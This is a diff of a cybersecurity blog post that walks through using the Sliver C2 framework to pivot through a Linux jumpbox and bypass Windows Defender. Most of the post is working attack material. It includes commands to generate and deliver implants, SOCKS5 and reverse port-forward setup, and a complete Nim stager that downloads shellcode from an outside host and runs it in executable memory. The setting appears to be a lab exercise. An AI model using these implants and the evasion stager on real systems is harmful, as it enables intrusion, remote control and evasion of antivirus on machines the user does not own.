@@ -9,23 +9,23 @@
     <meta name="description" content="Pivoting and Bypassing Defender with Sliver C2InstallationSliver provides an install script which gets you up and running in no time. You can run it with: 1curl https:&#x2F;&#x2F;sliver.sh&#x2F;install | sudo bash">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sliver-Tunneling-and-AV-bypass">
-<meta property="og:url" content="https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/index.html">
+<meta property="og:url" content="http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/index.html">
 <meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
 <meta property="og:description" content="Pivoting and Bypassing Defender with Sliver C2InstallationSliver provides an install script which gets you up and running in no time. You can run it with: 1curl https:&#x2F;&#x2F;sliver.sh&#x2F;install | sudo bash">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sliver_Tunnel/sliver_base.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sliver_Tunnel/session_sliver.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sliver_Tunnel/ifconfig.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sliver_Tunnel/it_wokrs.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sliver_Tunnel/network.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sliver_Tunnel/boom.png">
-<meta property="article:published_time" content="2025-06-09T21:54:33.000Z">
-<meta property="article:modified_time" content="2025-06-09T18:55:02.249Z">
+<meta property="og:image" content="http://example.com/images/Sliver_Tunnel/sliver_base.png">
+<meta property="og:image" content="http://example.com/images/Sliver_Tunnel/session_sliver.png">
+<meta property="og:image" content="http://example.com/images/Sliver_Tunnel/ifconfig.png">
+<meta property="og:image" content="http://example.com/images/Sliver_Tunnel/it_wokrs.png">
+<meta property="og:image" content="http://example.com/images/Sliver_Tunnel/network.png">
+<meta property="og:image" content="http://example.com/images/Sliver_Tunnel/boom.png">
+<meta property="article:published_time" content="2025-06-10T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-13T10:50:04.732Z">
 <meta property="article:author" content="Panosoiko">
 <meta property="article:tag" content="C2">
 <meta property="article:tag" content="Sliver">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://panosoikogr.github.io/images/Sliver_Tunnel/sliver_base.png">
+<meta name="twitter:image" content="http://example.com/images/Sliver_Tunnel/sliver_base.png">
     
     
       
@@ -35,12 +35,12 @@
       
       
         
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
         
       
       
         
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
         
       
     
@@ -72,7 +72,7 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 8.0.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -92,7 +92,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
@@ -105,7 +105,7 @@
         <li><a class="icon" aria-label="Previous post" href="/2025/06/29/AWS-and-Sliver-C2-setup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2025/06/03/CloudGoat-ECS-Takeover/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -118,17 +118,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&text=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&is_video=false&description=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Sliver-Tunneling-and-AV-bypass&body=Check out this article: https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&name=Sliver-Tunneling-and-AV-bypass&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&t=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&text=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&is_video=false&description=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sliver-Tunneling-and-AV-bypass&body=Check out this article: http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&name=Sliver-Tunneling-and-AV-bypass&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&t=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -160,7 +160,7 @@
       
     <div class="postdate">
       
-        <time datetime="2025-06-09T21:54:33.000Z" class="dt-published" itemprop="datePublished">2025-06-09</time>
+        <time datetime="2025-06-10T04:00:00.000Z" class="dt-published" itemprop="datePublished">2025-06-10</time>
         
       
     </div>
@@ -180,44 +180,43 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="Pivoting-and-Bypassing-Defender-with-Sliver-C2"><a href="#Pivoting-and-Bypassing-Defender-with-Sliver-C2" class="headerlink" title="Pivoting and Bypassing Defender with Sliver C2"></a>Pivoting and Bypassing Defender with Sliver C2</h1><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Sliver provides an <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/tree/master?tab=readme-ov-file#linux-one-liner">install script</a> which gets you up and running in no time. You can run it with:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sliver.sh/install | <span class="built_in">sudo</span> bash</span><br></pre></td></tr></table></figure>
+    <h1 id="Pivoting-and-Bypassing-Defender-with-Sliver-C2"><a href="#Pivoting-and-Bypassing-Defender-with-Sliver-C2" class="headerlink" title="Pivoting and Bypassing Defender with Sliver C2"></a>Pivoting and Bypassing Defender with Sliver C2</h1><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Sliver provides an <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/tree/master?tab=readme-ov-file">install script</a> which gets you up and running in no time. You can run it with:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sliver.sh/install | sudo bash</span><br></pre></td></tr></table></figure>
 
 <p>After installation, you can type <code>sliver</code> in the terminal.</p>
-<p><img src="/images/Sliver_Tunnel/sliver_base.png" alt="Sliver Base"></p>
+<p><img src="/images/Sliver_Tunnel/sliver_base.png" alt="Image: Sliver Base"></p>
 <p>As the jumpbox is a Linux machine, let’s first create an implant for it:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate --os linux --<span class="built_in">arch</span> amd64 --format elf --mtls 10.8.0.15 --save ~/Downloads/shell.elf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate --os linux --arch amd64 --format elf --mtls 10.8.0.15 --save ~/Downloads/shell.elf</span><br></pre></td></tr></table></figure>
 
 <p>Also, create a listener for it:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtls --lport 8888</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtls --lport 8888</span><br></pre></td></tr></table></figure>
 
 <p>On your Kali machine, use Python to host the file so you can grab it from the jumpbox:</p>
-<p><strong>Kali:</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>Kali:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
 
-<p><strong>Jumpbox:</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.8.0.15/shell.elf</span><br></pre></td></tr></table></figure>
+<p>Jumpbox:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.8.0.15/shell.elf</span><br></pre></td></tr></table></figure>
 
 <p>Now give it executable permissions and run it:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
 
 <p>Sliver session grabbed:</p>
-<p><img src="/images/Sliver_Tunnel/session_sliver.png" alt="Session Sliver"></p>
+<p><img src="/images/Sliver_Tunnel/session_sliver.png" alt="Image: Session Sliver"></p>
 <p>Use the command <code>sessions</code> to view active sessions and their IDs. Use <code>use &lt;ID&gt;</code> to interact with the desired session.</p>
 <hr>
 <h2 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h2><p>First, we need to check if there’s an internal network on the machine we’re on. Run:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/Sliver_Tunnel/ifconfig.png" alt="Ifconfig Output"></p>
+<p><img src="/images/Sliver_Tunnel/ifconfig.png" alt="Image: Ifconfig Output"></p>
 <p>Now we know there’s an internal network at <code>10.0.0.0/24</code>. Let’s use a SOCKS5 proxy to access that internal network. First, look into <code>/etc/proxychains.conf</code> — it should look like this:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5  127.0.0.1   1081</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5  127.0.0.1   1081</span><br></pre></td></tr></table></figure>
 
 <p>Now in Sliver (inside the session), run:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 start</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 start</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/Sliver_Tunnel/it_wokrs.png" alt="SOCKS5 Works"></p>
-<p>Now using:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> proxychains4 &lt;<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Sliver_Tunnel/it_wokrs.png" alt="Image: SOCKS5 Works"><br>Now using:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains4 &lt;command&gt;</span><br></pre></td></tr></table></figure>
 
 <p>…you can proxy your commands and grab ports from the internal network, exposing them for further enumeration.</p>
 <hr>
@@ -228,33 +227,31 @@
 <li>Set up stagers</li>
 <li>Host our payload</li>
 </ul>
-<p><img src="/images/Sliver_Tunnel/network.png" alt="Network Topology"></p>
+<p><img src="/images/Sliver_Tunnel/network.png" alt="Image: Network Topology"></p>
 <p>The Windows PC can only reach the jumpbox, and we can reach the Windows PC through the jumpbox.</p>
 <hr>
 <h2 id="Setting-up-Sliver"><a href="#Setting-up-Sliver" class="headerlink" title="Setting up Sliver"></a>Setting up Sliver</h2><p>Set the session port that will connect to us:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd add -b 10.0.0.7:7999 -r 0.0.0.0:7999</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd add -b 10.0.0.7:7999 -r 0.0.0.0:7999</span><br></pre></td></tr></table></figure>
 
 <p>Generate the shellcode that our target will grab and execute:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate --mtls 10.0.0.7:7999 --os windows --<span class="built_in">arch</span> amd64 --format shellcode --save ~/Downloads/shellc.bin</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate --mtls 10.0.0.7:7999 --os windows --arch amd64 --format shellcode --save ~/Downloads/shellc.bin</span><br></pre></td></tr></table></figure>
 
 <p>Upload the binary to the jumpbox:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /path/shellc.bin</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /path/shellc.bin</span><br></pre></td></tr></table></figure>
 
 <p>Create a Python server on the jumpbox:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 1998</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 1998</span><br></pre></td></tr></table></figure>
 <p>Note that it points to <code>10.0.0.7</code> (the jumpbox), so we forward that port to us.</p>
 <p>Finally, create your listener:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtls --lport 7999</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtls --lport 7999</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h2 id="Stager"><a href="#Stager" class="headerlink" title="Stager"></a>Stager</h2><p>We’ll use a custom stager from this post:<br><a target="_blank" rel="noopener" href="https://www.numencyber.com/defeating-windows-defender-using-different-programming-languages-with-sliver-c2-shellcode/">https://www.numencyber.com/defeating-windows-defender-using-different-programming-languages-with-sliver-c2-shellcode/</a></p>
-<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> winim/lean</span><br><span class="line"><span class="keyword">import</span> httpclient</span><br><span class="line"></span><br><span class="line"><span class="keyword">func</span> toByteSeq*(str: <span class="type">string</span>): <span class="type">seq</span>[byte] <span class="meta">&#123;.inline.&#125;</span> =</span><br><span class="line">  @(str.toOpenArrayByte(<span class="number">0</span>, str.high))</span><br><span class="line"></span><br><span class="line"><span class="keyword">proc</span> <span class="type">DownloadExecute</span>(url: <span class="type">string</span>): <span class="type">void</span> =</span><br><span class="line">  <span class="keyword">var</span> client = newHttpClient()</span><br><span class="line">  <span class="keyword">var</span> response: <span class="type">string</span> = client.getContent(url)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> shellcode: <span class="type">seq</span>[byte] = toByteSeq(response)</span><br><span class="line">  <span class="keyword">let</span> tProcess = <span class="type">GetCurrentProcessId</span>()</span><br><span class="line">  <span class="keyword">var</span> pHandle: <span class="type">HANDLE</span> = <span class="type">OpenProcess</span>(<span class="type">PROCESS_ALL_ACCESS</span>, <span class="type">FALSE</span>, tProcess)</span><br><span class="line">  defer: <span class="type">CloseHandle</span>(pHandle)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> rPtr = <span class="type">VirtualAllocEx</span>(pHandle, <span class="type">NULL</span>, <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](len(shellcode)), <span class="number">0x3000</span>, <span class="type">PAGE_EXECUTE_READ_WRITE</span>)</span><br><span class="line">  copyMem(rPtr, <span class="keyword">addr</span> shellcode[<span class="number">0</span>], len(shellcode))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> f = <span class="keyword">cast</span>[<span class="keyword">proc</span>() <span class="meta">&#123;.nimcall.&#125;</span>](rPtr)</span><br><span class="line">  f()</span><br><span class="line"></span><br><span class="line"><span class="keyword">when</span> defined(windows):</span><br><span class="line">  <span class="keyword">when</span> isMainModule:</span><br><span class="line">    <span class="type">DownloadExecute</span>(<span class="string">&quot;http://&lt;JUMPBOX_IP&gt;:1999/shellc.bin&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import winim/lean</span><br><span class="line">import httpclient</span><br><span class="line">func toByteSeq*(str: string): seq[byte] &#123;.inline.&#125; =</span><br><span class="line">  @(str.toOpenArrayByte(0, str.high))</span><br><span class="line"></span><br><span class="line">proc DownloadExecute(url: string): void =</span><br><span class="line">  var client = newHttpClient()</span><br><span class="line">  var response: string = client.getContent(url)</span><br><span class="line"></span><br><span class="line">  var shellcode: seq[byte] = toByteSeq(response)</span><br><span class="line">  let tProcess = GetCurrentProcessId()</span><br><span class="line">  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)</span><br><span class="line">  defer: CloseHandle(pHandle)</span><br><span class="line">  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)</span><br><span class="line">  copyMem(rPtr, addr shellcode[0], len(shellcode))</span><br><span class="line"></span><br><span class="line">  let f = cast[proc() &#123;.nimcall.&#125;](rPtr)</span><br><span class="line">  f()</span><br><span class="line"></span><br><span class="line">when defined(windows):</span><br><span class="line">  when isMainModule:</span><br><span class="line">    DownloadExecute(&quot;http://&lt;JUMPBOX_IP&gt;:1999/shellc.bin&quot;)</span><br></pre></td></tr></table></figure>
 
 <p>Replace <code>&quot;http://&lt;JUMPBOX_IP&gt;:1999/shellc.bin&quot;</code> with your actual jumpbox IP.</p>
-<p>Now compile it with Nim, send it to the Windows target, and execute it.</p>
-<p>If it doesn’t work, verify the <code>.bin</code> is being downloaded correctly and that your reverse ports are configured properly.</p>
-<p><img src="/images/Sliver_Tunnel/boom.png" alt="Shell Popped"></p>
+<p>Now compile it with Nim, send it to the Windows target, and execute it.<br>If it doesn’t work, verify the <code>.bin</code> is being downloaded correctly and that your reverse ports are configured properly.</p>
+<p><img src="/images/Sliver_Tunnel/boom.png" alt="Image: Shell Popped"></p>
 
   </div>
 </article>
@@ -276,7 +273,7 @@
         
           <li><a href="/search/">Search</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/tags/">tags</a></li>
         
           <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
         
@@ -292,17 +289,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&text=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&is_video=false&description=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Sliver-Tunneling-and-AV-bypass&body=Check out this article: https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&name=Sliver-Tunneling-and-AV-bypass&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/10/Sliver-Tunneling-and-AV-bypass/&t=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
